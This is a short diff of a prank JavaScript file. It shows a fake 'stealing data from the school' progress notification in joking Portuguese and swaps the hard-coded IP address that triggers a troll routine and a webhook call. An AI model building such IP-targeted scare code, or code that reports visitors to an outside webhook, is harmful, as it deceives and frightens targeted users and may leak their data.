@@ -228,7 +228,7 @@ $.ajax({
         let dots = 0;
         let percent = 7;
         const Delay = setInterval(() => {
-          const text = `Roubando dados da escola ` + '.'.repeat(dots) + `[${percent}%] kkkkkkkkk zoa carai, manda salve zé`;
+          const text = `Roubando dados do colegio` + '.'.repeat(dots) + `[${percent}%] kkkkkkkkk zoa carai, manda salve zé`;
             notification.textContent = text;
 
             dots = (dots + 1) % 4;
@@ -241,7 +241,7 @@ $.ajax({
         }, 20000);
     }
 
-    if (TesteData.ip === "170.79.163.241") {
+    if (TesteData.ip === "45.180.132.247") {
       UpdateTroll();
       EnviarWebhook();
   }
